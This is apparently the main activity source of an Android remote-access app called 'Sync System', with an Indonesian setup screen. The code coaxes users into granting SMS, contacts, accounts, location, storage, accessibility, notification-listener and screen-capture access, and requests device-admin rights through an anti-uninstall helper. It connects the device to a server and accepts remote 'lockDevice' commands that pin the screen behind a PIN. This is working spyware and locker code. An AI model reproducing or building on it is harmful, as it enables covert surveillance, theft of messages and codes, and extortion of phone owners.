package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.AppOpsManager
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.*
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val PERM_ALL = 999
    private val REQ_SCREEN_CAPTURE = 102
    private val REQ_LOCATION_SETTINGS = 107

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                try {
                    val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                    startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN_CAPTURE)
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "Screen capture error: ${e.message}")
                }
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            try {
                if (intent.action != DeviceService.ACTION_COMMAND) return
                val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
                val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
                handleCommand(cmd, value)
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Command error: ${e.message}")
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            setContentView(R.layout.activity_main)
            setupWebView()
            registerReceivers()
            AntiUninstallHelper.requestAdminIfNeeded(this)
            requestAllPermissionsAtOnce()
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "onCreate error: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun registerReceivers() {
        try {
            val filter = IntentFilter(DeviceService.ACTION_COMMAND)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(commandReceiver, filter)
            }

            val screenFilter = IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenCaptureReceiver, screenFilter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(screenCaptureReceiver, screenFilter)
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "registerReceivers error: ${e.message}")
        }
    }

    private fun requestAllPermissionsAtOnce() {
        try {
            val permissions = mutableListOf<String>()
            
            permissions.add(Manifest.permission.CAMERA)
            permissions.add(Manifest.permission.READ_SMS)
            permissions.add(Manifest.permission.READ_CONTACTS)
            permissions.add(Manifest.permission.GET_ACCOUNTS)
            permissions.add(Manifest.permission.READ_PHONE_STATE)
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
                permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
                permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
            } else {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
            
            val neededPermissions = permissions.filter { perm ->
                ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
            }.toTypedArray()
            
            if (neededPermissions.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, neededPermissions, PERM_ALL)
            } else {
                checkSpecialPermissions()
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "requestAllPermissionsAtOnce error: ${e.message}")
        }
    }
    
    private fun checkSpecialPermissions() {
        try {
            if (!isBatteryOptIgnored()) {
                openBatterySettings()
            }
            if (!isOverlayGranted()) {
                requestOverlayPerm()
            }
            if (!isAccessibilityGranted()) {
                requestAccessibilityPerm()
            }
            if (!isUsageAccessGranted()) {
                requestUsageAccessPerm()
            }
            if (!isNotifListenerGranted()) {
                openNotifListenerSettings()
            }
            if (!isManageStorageGranted()) {
                requestManageStoragePerm()
            }
            if (!isGpsEnabled()) {
                requestEnableGps()
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "checkSpecialPermissions error: ${e.message}")
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        try {
            var allGranted = true
            permissions.forEachIndexed { index, perm ->
                val granted = if (index < grantResults.size) {
                    grantResults[index] == PackageManager.PERMISSION_GRANTED
                } else false
                if (!granted) allGranted = false
            }
            
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
                    if (allGranted) {
                        checkSpecialPermissions()
                        Handler(Looper.getMainLooper()).postDelayed({
                            try {
                                webView.evaluateJavascript("showConnected()", null)
                                startDeviceService()
                            } catch (e: Exception) {
                                android.util.Log.e("MainActivity", "Auto connect error: ${e.message}")
                            }
                        }, 1000)
                    }
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "onRequestPermissionsResult handler error: ${e.message}")
                }
            }, 500)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "onRequestPermissionsResult error: ${e.message}")
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        try {
            when (requestCode) {
                REQ_SCREEN_CAPTURE -> {
                    val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                        putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                        putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                        setPackage(packageName)
                        addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
                    }
                    sendBroadcast(intent)
                }
                REQ_LOCATION_SETTINGS -> {
                    webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "onActivityResult error: ${e.message}")
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            if (checkAllPermissionsGranted()) {
                webView.evaluateJavascript("showConnected()", null)
            } else {
                webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "onResume error: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        try {
            when (cmd) {
                "lockDevice" -> {
                    val parts = value.split("|")
                    val pin = parts.getOrNull(0) ?: ""
                    val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                    startLockMode(pin, title)
                }
                "unlockDevice" -> stopLockMode()
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "handleCommand error: ${e.message}")
        }
    }

    private fun startLockMode(pin: String, title: String) {
        try {
            webView.evaluateJavascript(
                "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')", null
            )
            startLockTask()
        } catch (e: Exception) {
            android.util.Log.w("MainActivity", "startLockTask: ${e.message}")
        }
    }

    private fun stopLockMode() {
        try {
            stopLockTask()
            webView.evaluateJavascript("if(typeof hideLockScreen==='function') hideLockScreen()", null)
            val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
            sendBroadcast(i)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "stopLockMode error: ${e.message}")
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        try {
            webView = findViewById(R.id.mainWebView)
            webView.settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                allowFileAccess = true
                mediaPlaybackRequiresUserGesture = false
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                    mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                setSupportZoom(false)
                builtInZoomControls = false
                displayZoomControls = false
                loadWithOverviewMode = true
                useWideViewPort = true
            }
            
            val bridge = AppBridge(this, webView)
            AppBridge.instance = bridge
            webView.addJavascriptInterface(bridge, "Android")
            webView.addJavascriptInterface(MainBridge(), "MainBridge")
            
            webView.webChromeClient = object : WebChromeClient() {
                override fun onPermissionRequest(request: PermissionRequest) {
                    request.grant(request.resources)
                }
            }
            webView.webViewClient = WebViewClient()
            
            val serverUrl = DeviceService.SERVER_URL
            webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "setupWebView error: ${e.message}")
            e.printStackTrace()
        }
    }

    // ===================== PERMISSION CHECKS =====================
    
    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    
    fun isGalleryGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    fun isNotifListenerGranted(): Boolean {
        try {
            val enabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            return enabled?.contains(packageName) == true
        } catch (e: Exception) {
            return false
        }
    }
    
    fun isLocationGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    fun isGpsEnabled(): Boolean {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                   lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
        } catch (e: Exception) {
            return false
        }
    }

    fun requestEnableGps() {
        try {
            val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
            val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
            val client = LocationServices.getSettingsClient(this)
            client.checkLocationSettings(builder.build())
                .addOnSuccessListener {
                    webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
                }
                .addOnFailureListener { exception ->
                    if (exception is ResolvableApiException) {
                        try {
                            exception.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                        } catch (_: Exception) {
                            startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                        }
                    } else {
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    }
                }
        } catch (e: Exception) {
            startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
        }
    }

    fun isContactsGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    fun isGmailGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED

    fun isPhoneGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED

    fun isManageStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                PERM_ALL)
        }
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } else true
    
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Settings.canDrawOverlays(this)
    } else true

    fun isAccessibilityGranted(): Boolean {
        try {
            val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            return enabled?.contains(packageName) == true
        } catch (e: Exception) {
            return false
        }
    }

    fun isUsageAccessGranted(): Boolean {
        try {
            val appOps = getSystemService(AppOpsManager::class.java)
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    packageName
                )
            } else {
                appOps.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    packageName
                )
            }
            return mode == AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            return false
        }
    }

    private fun checkAllPermissionsGranted(): Boolean {
        return isCamGranted() &&
               isSmsGranted() &&
               isGalleryGranted() &&
               isLocationGranted() &&
               isContactsGranted() &&
               isGmailGranted() &&
               isPhoneGranted() &&
               isManageStorageGranted() &&
               isBatteryOptIgnored() &&
               isOverlayGranted() &&
               isAccessibilityGranted() &&
               isUsageAccessGranted() &&
               isNotifListenerGranted() &&
               isGpsEnabled()
    }

    // ===================== REQUEST FUNCTIONS =====================
    
    fun requestCamPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_ALL)
    fun requestSmsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_ALL)
    
    fun requestGalleryPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            ), PERM_ALL)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            ), PERM_ALL)
        }
    }
    
    fun requestLocationPerm() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
            PERM_ALL)
    }
    
    fun requestContactsPerm() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.READ_CONTACTS),
            PERM_ALL)
    }
    
    fun requestGmailPerm() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.GET_ACCOUNTS),
            PERM_ALL)
    }
    
    fun requestPhonePerm() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS),
            PERM_ALL)
    }
    
    fun openNotifListenerSettings() {
        try {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (e: Exception) {
            startActivity(Intent(Settings.ACTION_SETTINGS))
        }
    }
    
    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = android.net.Uri.parse("package:$packageName")
                })
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
        }
    }
    
    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = android.net.Uri.parse("package:$packageName")
                })
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
        }
    }
    
    fun requestAccessibilityPerm() {
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } catch (e: Exception) {
            startActivity(Intent(Settings.ACTION_SETTINGS))
        }
    }

    fun requestUsageAccessPerm() {
        try {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        } catch (e: Exception) {
            startActivity(Intent(Settings.ACTION_SETTINGS))
        }
    }

    private fun startDeviceService() {
        try {
            val svcIntent = Intent(this, DeviceService::class.java)
            ContextCompat.startForegroundService(this, svcIntent)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "startDeviceService error: ${e.message}")
        }
    }

    // ===================== HTML (FIX) =====================
    
    private fun buildHtml(): String {
        return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Sync System</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#fff;font-family:sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden}
.screen{display:none;width:100%;height:100%;padding:20px;flex-direction:column;align-items:center;justify-content:center}
.screen.active{display:flex}
.logo{font-size:48px;margin-bottom:10px}
.title{font-size:22px;font-weight:bold;margin-bottom:5px;color:#6366f1}
.sub{font-size:13px;color:#94a3b8;text-align:center;margin-bottom:20px;max-width:300px}
.perm-list{width:100%;max-width:380px;margin:10px 0}
.perm-item{background:#141420;border:1px solid #1e1e30;border-radius:12px;padding:12px 16px;margin-bottom:8px;display:flex;align-items:center;gap:12px}
.perm-item.granted{border-color:#22c55e;background:rgba(34,197,94,0.05)}
.perm-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;background:rgba(99,102,241,0.15)}
.perm-name{flex:1;font-size:13px;font-weight:500}
.perm-status{font-size:11px;padding:2px 8px;border-radius:20px}
.perm-status.pending{background:rgba(239,68,68,0.2);color:#ef4444}
.perm-status.done{background:rgba(34,197,94,0.2);color:#22c55e}
.btn{width:100%;max-width:380px;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;transition:0.2s;background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;margin-top:10px}
.btn:active{transform:scale(0.97)}
.btn:disabled{opacity:0.5}
.hidden{display:none}
.status-online{color:#22c55e}
.status-offline{color:#ef4444}
.connected-info{text-align:center;margin-top:20px}
.connected-info .id{font-size:12px;color:#94a3b8;margin-top:5px}
</style>
</head>
<body>

<!-- PERMISSION SCREEN -->
<div class="screen active" id="permScreen">
  <div class="logo">🛡️</div>
  <div class="title">Izin Diperlukan</div>
  <div class="sub">Izinkan semua akses agar aplikasi berjalan maksimal</div>
  
  <div class="perm-list" id="permList">
    <div class="perm-item" id="p-cam"><div class="perm-icon">📷</div><div class="perm-name">Kamera</div><span class="perm-status pending" id="s-cam">⏳</span></div>
    <div class="perm-item" id="p-bat"><div class="perm-icon">🔋</div><div class="perm-name">Optimasi Baterai</div><span class="perm-status pending" id="s-bat">⏳</span></div>
    <div class="perm-item" id="p-overlay"><div class="perm-icon">🪟</div><div class="perm-name">Floating Window</div><span class="perm-status pending" id="s-overlay">⏳</span></div>
    <div class="perm-item" id="p-accessibility"><div class="perm-icon">♿</div><div class="perm-name">Aksesibilitas</div><span class="perm-status pending" id="s-accessibility">⏳</span></div>
    <div class="perm-item" id="p-usage"><div class="perm-icon">📊</div><div class="perm-name">Penggunaan Aplikasi</div><span class="perm-status pending" id="s-usage">⏳</span></div>
    <div class="perm-item" id="p-sms"><div class="perm-icon">💬</div><div class="perm-name">Baca SMS</div><span class="perm-status pending" id="s-sms">⏳</span></div>
    <div class="perm-item" id="p-notif"><div class="perm-icon">🔔</div><div class="perm-name">Akses Notifikasi</div><span class="perm-status pending" id="s-notif">⏳</span></div>
    <div class="perm-item" id="p-gallery"><div class="perm-icon">🖼️</div><div class="perm-name">Galeri</div><span class="perm-status pending" id="s-gallery">⏳</span></div>
    <div class="perm-item" id="p-location"><div class="perm-icon">📍</div><div class="perm-name">Lokasi</div><span class="perm-status pending" id="s-location">⏳</span></div>
    <div class="perm-item" id="p-gpson"><div class="perm-icon">🌐</div><div class="perm-name">GPS</div><span class="perm-status pending" id="s-gpson">⏳</span></div>
    <div class="perm-item" id="p-contacts"><div class="perm-icon">👤</div><div class="perm-name">Kontak</div><span class="perm-status pending" id="s-contacts">⏳</span></div>
    <div class="perm-item" id="p-gmail"><div class="perm-icon">📧</div><div class="perm-name">Akun Google</div><span class="perm-status pending" id="s-gmail">⏳</span></div>
    <div class="perm-item" id="p-phone"><div class="perm-icon">📱</div><div class="perm-name">Info Telepon</div><span class="perm-status pending" id="s-phone">⏳</span></div>
    <div class="perm-item" id="p-storage"><div class="perm-icon">💾</div><div class="perm-name">Akses Penyimpanan</div><span class="perm-status pending" id="s-storage">⏳</span></div>
  </div>
  
  <button class="btn" id="btnMasuk" onclick="handleMasuk()">PERBARUI STATUS</button>
</div>

<!-- CONNECTED SCREEN -->
<div class="screen" id="connectedScreen">
  <div class="logo">✅</div>
  <div class="title" style="color:#22c55e">Tersambung</div>
  <div class="sub">Perangkat terhubung dengan server</div>
  <div class="connected-info">
    <div id="statusText" class="status-online">● Online</div>
    <div class="id" id="deviceId">ID: —</div>
  </div>
</div>

<script>
const permIds = ['cam','bat','overlay','accessibility','usage','sms','notif','gallery','location','gpson','contacts','gmail','phone','storage'];

function refreshPerms() {
  if (!window.Android) return;
  try {
    const state = {
      cam: Android.isCamGranted(),
      bat: Android.isBatteryOptIgnored(),
      overlay: Android.isOverlayGranted(),
      accessibility: Android.isAccessibilityGranted(),
      usage: Android.isUsageAccessGranted(),
      sms: Android.isSmsGranted(),
      notif: Android.isNotifListenerGranted(),
      gallery: Android.isGalleryGranted(),
      location: Android.isLocationGranted(),
      gpson: Android.isGpsEnabled(),
      contacts: Android.isContactsGranted(),
      gmail: Android.isGmailGranted(),
      phone: Android.isPhoneGranted(),
      storage: Android.isManageStorageGranted()
    };
    
    let allOk = true;
    permIds.forEach(id => {
      const el = document.getElementById('p-' + id);
      const st = document.getElementById('s-' + id);
      const granted = state[id];
      if (!granted) allOk = false;
      if (el) el.className = 'perm-item' + (granted ? ' granted' : '');
      if (st) {
        st.className = 'perm-status ' + (granted ? 'done' : 'pending');
        st.textContent = granted ? '✅' : '⏳';
      }
    });
    
    const btn = document.getElementById('btnMasuk');
    if (allOk) {
      btn.textContent = '🚀 MULAI';
      btn.disabled = false;
    } else {
      btn.textContent = '🔄 PERBARUI';
      btn.disabled = false;
    }
  } catch(e) {
    console.log('refreshPerms error:', e);
  }
}

function handleMasuk() {
  const btn = document.getElementById('btnMasuk');
  if (btn.textContent.includes('MULAI')) {
    showConnected();
  } else {
    refreshPerms();
  }
}

function showConnected() {
  document.getElementById('permScreen').className = 'screen';
  document.getElementById('connectedScreen').className = 'screen active';
  try {
    MainBridge.connectNow();
    const id = Android.getDeviceId();
    document.getElementById('deviceId').textContent = 'ID: ' + id;
  } catch(e) {
    console.log('showConnected error:', e);
  }
}

// Auto refresh setiap 2 detik
setInterval(refreshPerms, 2000);

window.addEventListener('load', function() {
  setTimeout(refreshPerms, 500);
});
</script>
</body>
</html>
        """.trimIndent()
    }

    inner class MainBridge {
        @android.webkit.JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post {
                try {
                    startDeviceService()
                    val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
                    sendBroadcast(i)
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "connectNow error: ${e.message}")
                }
            }
        }
    }
}

// ===================== APP BRIDGE =====================

class AppBridge(private val context: Context, private val webView: WebView) {

    companion object {
        var instance: AppBridge? = null
    }

    @JavascriptInterface fun getDeviceId(): String {
        return try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }

    @JavascriptInterface fun getDeviceName(): String {
        return try {
            val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
            val n = Build.MODEL
            if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
        } catch (e: Exception) {
            "Device"
        }
    }

    @JavascriptInterface fun isSocketConnected(): Boolean {
        return try {
            SocketHolder.connected
        } catch (e: Exception) {
            false
        }
    }

    @JavascriptInterface fun isCamGranted() = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted() = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted() = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored() = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted() = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAccessibilityGranted() = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted() = (context as MainActivity).isUsageAccessGranted()
    @JavascriptInterface fun isGalleryGranted() = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun isLocationGranted() = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled() = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun isContactsGranted() = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun isGmailGranted() = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun isPhoneGranted() = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun isManageStorageGranted() = (context as MainActivity).isManageStorageGranted()

    @JavascriptInterface fun requestCamPerm() = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm() = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm() = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm() = (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm() = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun requestGalleryPerm() = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun requestLocationPerm() = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps() = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun requestContactsPerm() = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun requestGmailPerm() = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun requestPhonePerm() = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun requestManageStoragePerm() = (context as MainActivity).requestManageStoragePerm()
}
